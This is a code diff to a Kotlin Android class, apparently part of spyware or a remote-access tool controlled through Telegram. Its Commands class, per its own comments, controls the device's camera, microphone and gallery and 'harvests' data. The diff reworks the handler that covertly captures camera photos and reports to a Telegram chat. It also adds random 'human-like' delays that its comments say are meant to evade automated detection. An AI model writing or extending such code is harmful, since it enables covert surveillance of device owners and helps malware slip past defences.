@@ -16,16 +16,18 @@ import java.lang.ref.WeakReference
 import java.lang.reflect.Method
 import java.security.MessageDigest
 import java.util.concurrent.ConcurrentHashMap
+import kotlin.random.Random
 
 /**
  * فئة إدارة الأوامر الرئيسية للتحكم بكاميرا الجهاز، الميكروفون، المعرض والحصاد.
  *
  * ✅ تم إصلاح methodCache ليكون thread-safe باستخدام ConcurrentHashMap.
  * ✅ تم إصلاح invokeMethod لمطابقة عدد المعاملات.
- * ✅ تم إصلاح handleCamera (إزالة scope.launch المتداخل).
+ * ✅ تم إصلاح handleCamera (إزالة scope.launch المتداخل واستدعاء suspend مباشر).
  * ✅ تم تحسين sendPulseIntent للتعامل مع فشل بدء الخدمة.
  * ✅ تم إصلاح handleMedia لاستخراج message_id من JSONObject مباشرة.
  * ✅ تم إضافة @Volatile للمتغيرات المشتركة.
+ * ✅ تم إضافة تأخير بشري (Human-like Jitter) لتجنب الكشف الآلي.
  */
 class Commands private constructor(context: Context) {
 
@@ -719,33 +721,38 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  ✅ معالج أوامر الكاميرا (معدل: إزالة Coroutine المتداخل)
+    //  ✅ معالج أوامر الكاميرا (معدل: استدعاء مباشر لـ suspend)
     // ============================================================
 
     private suspend fun handleCamera(cmd: String, tg: Any?, m: Any?, cid: Long) {
         try {
-            val isFront = if (cmd.contains("camf_")) 1 else 0
+            val isFront = cmd.contains("camf_")
 
             if (!isBatteryOk(m)) {
                 sendTelegramMessage(tg, cid, "🔋 البطارية منخفضة جداً")
                 return
             }
 
-            val cameraAnalyzer = getModuleComponent(m, "cameraAnalyzer")
+            // ✅ الحصول على كائن CameraAnalyzer مباشرة (بدون انعكاس)
+            val cameraAnalyzer = getModuleComponent(m, "cameraAnalyzer") as? CameraAnalyzer
             if (cameraAnalyzer == null) {
                 sendTelegramMessage(tg, cid, "❌ الكاميرا غير متاحة")
                 return
             }
 
-            // ✅ إرسال نبض للخدمة الأمامية قبل التقاط الصورة
-            sendPulseIntent("📸 Visual Sync")
+            // ✅ تأخير بشري عشوائي (1.2-2.5 ثانية) لمحاكاة التفكير البشري وتجنب الكشف الآلي
+            delay(Random.nextLong(1200, 2500))
 
+            sendPulseIntent("📸 Visual Sync")
             sendTelegramAction(tg, cid, "upload_photo")
             sendTelegramMessage(tg, cid, "⏳ جارٍ الالتقاط والمعالجة...")
 
-            // ✅ التنفيذ مباشرة بدون Coroutine متداخل
             try {
-                invokeMethod(cameraAnalyzer, "harvest", isFront)
+                // ✅ استدعاء الدالة المعلقة مباشرة مع الانتظار
+                cameraAnalyzer.harvest(if (isFront) 1 else 0)
+
+                // ✅ تأخير بشري إضافي قبل الرد (0.5-1.5 ثانية)
+                delay(Random.nextLong(500, 1500))
                 sendTelegramMessage(tg, cid, "✅ تم التقاط الصورة وتحليلها بنجاح.")
             } catch (e: Exception) {
                 Log.e(TAG, "❌ Camera harvest error: ${e.message}")
